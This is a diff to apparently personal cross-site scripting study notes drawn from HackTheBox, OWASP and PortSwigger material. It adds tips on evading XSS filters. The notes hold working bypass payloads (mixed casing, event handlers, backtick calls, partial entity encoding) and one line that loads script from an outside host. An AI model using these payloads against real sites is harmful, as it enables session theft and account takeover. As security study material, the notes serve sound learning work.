@@ -2,6 +2,9 @@
 - [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
 - [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
 - [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
+- [PortSwigger Xss](https://portswigger.net/web-security/cross-site-scripting)
+
+# TL;DR
 
 # Notes
 ## Attacking and Exploiting Modern Web Applications (Kindle)
@@ -29,12 +32,20 @@ Client-side filters are relatively easy to bypass with BurpSuite, Server-side fi
 ### How might these filters be implemented?
 - Allow listing (Whitelisting) of allowed elements, attributes or characters.
 - Blacklisting of allowed elements, attributes or characters.
+- Filters are often layered. A payload may pass one filter but get caught by another
+- Input could be truncated after a certain number of characters so worth trying short payloads. Some browsers will let you omit `http` or `https` by using `//` e.g `<script/src=//v.ht/aa`
+- HTML is case-sensitive whilst JavaScript is not.
+- Authoers favourite way to evaluate what characters are encoded or not, as it will help determine which useful characters are permitted, encoded, removed and whether the input is in upper or lowercase:
+```
+;:!--''" <SCs>=&{[(`)]}//.
+```
+
 
 ### Weak Blacklists
 - Casing: `<ScRiPt>alert(1);</ScRiPt>`
 - Casing: `<object data="JaVaScRiPt:alert(1)">`
 - Casing: `<img src=x OnErRoR=alert(1)>`
-- No Space: `<svg/onload=alert(1)>`
+- No Space allowed: `<svg/onload=alert(1)>`
 - If `img` is blocked, try `audio` or `video`
 - If `alert` is blocked, try `prompt` or `confirm`
 - If parenthesis `()` are blocked, try the back tick `
@@ -42,6 +53,7 @@ Client-side filters are relatively easy to bypass with BurpSuite, Server-side fi
 ```
 <audio src onloadstart=confirm`1`>
 ```
+- Partial encoding e.g if the string `javascript:` is blocked, try `j&#X41vascript:`
 
 ### JavaScript Encodings
 - Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
